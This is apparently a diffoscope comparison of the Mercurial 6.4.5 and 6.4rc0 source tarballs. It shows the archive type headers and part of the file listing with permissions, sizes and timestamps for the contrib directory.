# Comparing `tmp/mercurial-6.4.5.tar.gz` & `tmp/mercurial-6.4rc0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "mercurial-6.4.5.tar", last modified: Thu Jun 22 09:18:52 2023, max compression
+gzip compressed data, was "mercurial-6.4rc0.tar", last modified: Thu Mar  2 22:30:09 2023, max compression
```

## Comparing `mercurial-6.4.5.tar` & `mercurial-6.4rc0.tar`

### file list

```diff
@@ -1,2418 +1,2413 @@
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.444352 mercurial-6.4.5/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      206 2023-06-22 09:18:26.000000 mercurial-6.4.5/.arcconfig
--rw-r--r--   0 alphare   (1000) alphare   (1000)      343 2023-06-22 09:18:26.000000 mercurial-6.4.5/.clang-format
--rw-r--r--   0 alphare   (1000) alphare   (1000)      348 2023-06-22 09:18:26.000000 mercurial-6.4.5/.editorconfig
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.356352 mercurial-6.4.5/.gitlab/
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.360352 mercurial-6.4.5/.gitlab/merge_request_templates/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      550 2023-06-22 09:18:26.000000 mercurial-6.4.5/.gitlab/merge_request_templates/Default.md
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1078 2023-06-22 09:18:26.000000 mercurial-6.4.5/.hgignore
--rw-r--r--   0 alphare   (1000) alphare   (1000)   141208 2023-06-22 09:18:48.000000 mercurial-6.4.5/.hgsigs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12283 2023-06-22 09:18:48.000000 mercurial-6.4.5/.hgtags
--rw-r--r--   0 alphare   (1000) alphare   (1000)      614 2023-06-22 09:18:26.000000 mercurial-6.4.5/.jshintrc
--rw-r--r--   0 alphare   (1000) alphare   (1000)      600 2023-06-22 09:18:26.000000 mercurial-6.4.5/CONTRIBUTING
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1663 2023-06-22 09:18:26.000000 mercurial-6.4.5/CONTRIBUTORS
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18092 2023-06-22 09:18:26.000000 mercurial-6.4.5/COPYING
--rw-r--r--   0 alphare   (1000) alphare   (1000)    86870 2023-06-22 09:18:51.000000 mercurial-6.4.5/MANIFEST.in
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9762 2023-06-22 09:18:26.000000 mercurial-6.4.5/Makefile
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1322 2023-06-22 09:18:52.444352 mercurial-6.4.5/PKG-INFO
--rw-r--r--   0 alphare   (1000) alphare   (1000)      958 2023-06-22 09:18:26.000000 mercurial-6.4.5/README.rst
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.360352 mercurial-6.4.5/contrib/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3219 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/Makefile.python
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4067 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/all-revsets.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)      397 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/asv.conf.json
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.360352 mercurial-6.4.5/contrib/automation/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9805 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/automation/README.rst
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1724 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/automation/automation.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.360352 mercurial-6.4.5/contrib/automation/hgautomation/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1508 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/automation/hgautomation/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    41049 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/automation/hgautomation/aws.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14557 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/automation/hgautomation/cli.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18087 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/automation/hgautomation/linux.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      551 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/automation/hgautomation/pypi.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2144 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/automation/hgautomation/ssh.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2474 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/automation/hgautomation/try_server.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17472 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/automation/hgautomation/windows.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2081 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/automation/hgautomation/winrm.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13276 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/automation/linux-requirements-py3.5.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)    21872 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/automation/linux-requirements-py3.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)      622 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/automation/linux-requirements.txt.in
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15975 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/automation/requirements.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)       28 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/automation/requirements.txt.in
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1711 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/base-revsets.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15235 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/bash_completion
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2142 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/bdiff-torture.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.360352 mercurial-6.4.5/contrib/benchmarks/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3952 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/benchmarks/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      614 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/benchmarks/perf.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1599 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/benchmarks/revset.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)    11670 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/byteify-strings.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      895 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/casesmash.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3627 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/catapipe.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)    35048 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/check-code.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3217 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/check-commit
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     5613 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/check-config.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3259 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/check-py3-compat.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     6143 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/check-pytype.sh
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/chg/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      895 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/chg/Makefile
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1223 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/chg/README
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1231 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/chg/chg.1
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15594 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/chg/chg.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15997 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/chg/hgclient.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)      866 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/chg/hgclient.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5881 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/chg/procutil.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)      528 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/chg/procutil.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4406 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/chg/util.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)      855 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/chg/util.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)      367 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/clang-format-ignorelist
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1179 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/debugcmdserver.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1452 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/debugshell.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.356352 mercurial-6.4.5/contrib/docker/
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/docker/apache-server/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      520 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/docker/apache-server/Dockerfile
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5211 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/docker/apache-server/README.rst
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     2154 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/docker/apache-server/entrypoint.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)       67 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/docker/apache-server/hgwebconfig
--rw-r--r--   0 alphare   (1000) alphare   (1000)      713 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/docker/apache-server/vhost.conf
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1351 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/dumprevlog
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1420 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/editmerge
--rw-r--r--   0 alphare   (1000) alphare   (1000)      102 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/editmergeps.bat
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1616 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/editmergeps.ps1
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/examples/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      496 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/examples/fix.hgrc
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/fuzz/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12668 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/FuzzedDataProvider.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4947 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/Makefile
--rw-r--r--   0 alphare   (1000) alphare   (1000)      894 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/README.rst
--rw-r--r--   0 alphare   (1000) alphare   (1000)      969 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/bdiff.cc
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1220 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/dirs.cc
--rw-r--r--   0 alphare   (1000) alphare   (1000)      661 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/dirs_corpus.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1062 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/dirstate.cc
--rw-r--r--   0 alphare   (1000) alphare   (1000)      479 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/dirstate_corpus.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1394 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/fm1readmarkers.cc
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1958 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/fm1readmarkers_corpus.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1851 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/fncache.cc
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1002 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/fuzzutil.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1398 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/jsonescapeu8fast.cc
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2075 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/manifest.cc
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1383 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/manifest_corpus.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3078 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/mpatch.cc
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23524 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/mpatch_corpus.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1752 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/pyutil.cc
--rw-r--r--   0 alphare   (1000) alphare   (1000)      228 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/pyutil.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1659 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/revlog.cc
--rw-r--r--   0 alphare   (1000) alphare   (1000)      812 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/revlog_corpus.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1515 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/standalone_fuzz_target_runner.cc
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1422 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/fuzz/xdiff.cc
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     4284 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/genosxversion.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4471 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/heptapod-ci.yml
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3541 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/hg-ssh
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3652 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/hg-test-mode.el
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4020 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/hgclient.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)   113188 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/hgk
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     2903 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/hgperf
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/hgsh/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      160 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/hgsh/Makefile
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8745 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/hgsh/hgsh.c
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      669 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/hgweb.fcgi
--rw-r--r--   0 alphare   (1000) alphare   (1000)      678 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/hgweb.wsgi
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)    27326 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/import-checker.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10848 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/install-windows-dependencies.ps1
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8847 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/logo-droplets.svg
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1006 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/memory.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    44271 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/mercurial.el
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/merge-lists/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14485 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/merge-lists/Cargo.lock
--rw-r--r--   0 alphare   (1000) alphare   (1000)      599 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/merge-lists/Cargo.toml
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/merge-lists/src/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10241 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/merge-lists/src/main.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/merge-lists/tests/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3310 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/merge-lists/tests/test-merge-lists.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12462 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/mq.el
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/packaging/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4059 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/Makefile
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1123 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/build-linux-wheels.sh
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     2667 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/builddeb
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     4530 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/buildrpm
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/packaging/debian/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      161 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/debian/cacerts.rc
--rw-r--r--   0 alphare   (1000) alphare   (1000)      164 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/debian/changelog
--rw-r--r--   0 alphare   (1000) alphare   (1000)        2 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/debian/compat
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1224 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/debian/control
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1072 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/debian/copyright
--rw-r--r--   0 alphare   (1000) alphare   (1000)       62 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/debian/default-tools.rc
--rw-r--r--   0 alphare   (1000) alphare   (1000)       38 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/debian/hgkpath.rc
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     4475 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/debian/rules
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/packaging/docker/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      298 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/docker/debian.template
--rw-r--r--   0 alphare   (1000) alphare   (1000)      275 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/docker/fedora.template
--rw-r--r--   0 alphare   (1000) alphare   (1000)      361 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/docker/rhel7
--rw-r--r--   0 alphare   (1000) alphare   (1000)      438 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/docker/rhel8
--rw-r--r--   0 alphare   (1000) alphare   (1000)      572 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/docker/rhel9
--rw-r--r--   0 alphare   (1000) alphare   (1000)      365 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/docker/ubuntu.template
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1462 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/dockerdeb
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1411 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/dockerrpm
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3501 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/hg-docker
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/packaging/hgpackaging/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/hgpackaging/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4074 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/hgpackaging/cli.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3728 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/hgpackaging/downloads.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4168 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/hgpackaging/inno.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5183 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/hgpackaging/pyoxidizer.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5918 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/hgpackaging/util.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2688 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/hgpackaging/wix.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/packaging/inno/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2424 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/inno/mercurial.iss
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5329 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/inno/modpath.iss
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1541 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/inno/readme.rst
--rw-r--r--   0 alphare   (1000) alphare   (1000)       59 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/linux-wheel-centos5-blacklist
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/packaging/macosx/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1857 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/macosx/Readme.html
--rw-r--r--   0 alphare   (1000) alphare   (1000)      794 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/macosx/Welcome.html
--rw-r--r--   0 alphare   (1000) alphare   (1000)      805 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/macosx/distribution.xml
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4843 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/mercurial.spec
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1312 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/packagelib.sh
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1720 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/packaging.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2065 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/requirements-macos.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)      545 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/requirements-macos.txt.in
--rw-r--r--   0 alphare   (1000) alphare   (1000)    24492 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/requirements-windows-py3.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)      507 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/requirements-windows.txt.in
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5151 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/requirements.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)      122 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/requirements.txt.in
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/packaging/wix/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1792 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/wix/COPYING.rtf
--rw-r--r--   0 alphare   (1000) alphare   (1000)      135 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/wix/defines.wxi
--rw-r--r--   0 alphare   (1000) alphare   (1000)      538 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/wix/guids.wxi
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5648 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/wix/mercurial.wxs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1949 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/packaging/wix/readme.rst
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/perf-utils/
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     5919 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/perf-utils/compare-discovery-case
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     2659 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/perf-utils/discovery-helper.sh
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3258 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/perf-utils/perf-revlog-write-plot.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     5321 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/perf-utils/search-discovery-case
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6001 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/perf-utils/subsetmaker.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)   124903 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/perf.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     2439 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/phab-clean.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1315 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/phab-refresh-stack.sh
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/plan9/
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1050 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/plan9/9diff
--rw-r--r--   0 alphare   (1000) alphare   (1000)      277 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/plan9/9mail
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1761 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/plan9/README
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/plan9/hgrc.d/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      192 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/plan9/hgrc.d/9diff.rc
